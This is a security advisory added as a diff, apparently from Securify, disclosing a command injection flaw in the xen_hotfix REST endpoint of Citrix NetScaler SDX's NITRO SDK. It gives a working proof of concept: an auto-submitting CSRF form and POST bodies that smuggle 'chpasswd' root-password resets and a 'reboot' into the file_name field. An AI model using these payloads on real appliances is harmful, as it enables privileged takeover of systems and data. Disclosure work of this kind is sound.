@@ -1,0 +1,51 @@
+Abstract
+
+
+Securify discovered a command injection vulnerability in xen_hotfix page of the NITRO SDK. The attacker-supplied command is executed with elevated privileges (nsroot). This issue can be used to compromise of the entire Citrix SDX appliance and all underling application's and data.
+
+Tested version
+
+
+This issue was discovered in Citrix NetScaler SDX svm-10.5-50-1.9, other versions may also be affected.
+
+Fix
+
+
+Citrix reports that this vulnerability is fixed in NetScaler 10.5 build 52.3nc.
+
+Introduction
+
+
+The Citrix NetScaler SDX platform delivers fully isolated NetScaler instances running on a single appliance. Each instance is a full-blown NetScaler environment, which optimizes delivery of applications over the Internet and private networks. The NITRO SDK allows you to configure and monitor the NetScaler appliance programmatically. NITRO exposes its functionality through REST interfaces. A Cross-Site Scripting vulnerability was found in one of the REST services exposed by the NITRO SDK.
+
+Administrators can upload XenServer hotfixes to the Citrix SDX appliance. The REST interface responsible for handling these hotfixes is vulnerable to command injection.
+
+Details
+
+
+This vulberability exists because the file_name parameter submitted to the /nitro/v1/config/xen_hotfix page used in a shell command without proper input validation/sanitation, introducing a command execution vulnerability. The shell command is executed with elevated privileges (nsroot), which allows attackers to run arbitrary commands with these privileges. This issue can be used to compromise of the entire Citrix SDX appliance and all underling application's and data.
+
+The following proof of concept can be used to exploit this issue;
+<html>
+   <body>
+      <form action="https://SDXHOSTIP/nitro/v1/config/xen_hotfix" method="POST">
+         <input type="hidden" name="object" value="&#123;"params"&#58;&#123;"action"&#58;"start"&#125;&#44;"xen&#95;hotfix"&#58;&#91;&#123;"file&#95;name"&#58;"&#46;&#46;&#47;&#46;&#46;&#47;etc&#47;passwd&#59;echo&#32;nsroot&#58;Securify&#124;chpasswd&#59;"&#125;&#93;&#125;" />
+         <input type="submit" value="Submit request" />
+      </form>
+      <script>document.forms[0].submit();</script>
+   </body>
+</html>
+
+
+
+POST /nitro/v1/config/xen_hotfix HTTP/1.1
+-----------------------------------------
+
+object={"params"%3a{"action"%3a"start"}%2c"xen_hotfix"%3a[{"file_name"../../etc/passwd;reboot;"}]}
+
+or
+
+object={"params"%3a{"action"%3a"start"}%2c"xen_hotfix"%3a[{"file_name"%3a"../../etc/passwd;echo nsroot:han|chpasswd;"}]}
+
+
+Due to insufficient Cross-Site Request Forgery protection, it is possible to exploit this issue by tricking a logged in admin user into visiting a specially crafted web page.
